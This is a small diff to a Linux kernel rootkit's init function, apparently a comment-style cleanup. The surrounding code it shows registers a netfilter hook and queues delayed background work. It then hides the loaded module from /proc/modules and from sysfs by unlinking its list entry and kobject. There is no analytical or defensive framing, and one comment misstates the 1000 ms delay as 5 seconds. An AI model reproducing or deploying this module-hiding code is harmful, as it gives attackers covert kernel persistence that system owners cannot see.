@@ -36,25 +36,25 @@ static int __init rootkit_init(void) {
 		nf_register_net_hook(&init_net, &nfho);
 	}
 
-	// Create a dedicated workqueue
+	/* Create a dedicated workqueue */
 	g_delayed_init_wq = create_singlethread_workqueue("delayed_module_init");
 	if (!g_delayed_init_wq) {
 		printk(KERN_ERR "Failed to create workqueue\\n");
 		return -ENOMEM;
 	}
 
-	// Initialize delayed work
+	/* Initialize delayed work */
 	INIT_DELAYED_WORK(&g_delayed_init_work, delayed_module_init_work);
 
-	// Queue initial work
+	/* Queue initial work */
 	queue_delayed_work(g_delayed_init_wq,
 		&g_delayed_init_work,
 		msecs_to_jiffies(1000)); // First check after 5 seconds
 
-	/* hide the module from /proc/modules */
+	/* Hide the module from /proc/modules */
 	list_del_init(&THIS_MODULE->list);
 
-	/* hide the module from /sys/modules */
+	/* Hide the module from /sys/modules */
 	kobject_del(&THIS_MODULE->mkobj.kobj);
 
 	printk(KERN_INFO "Module preliminary init complete, background initialization queued\n");
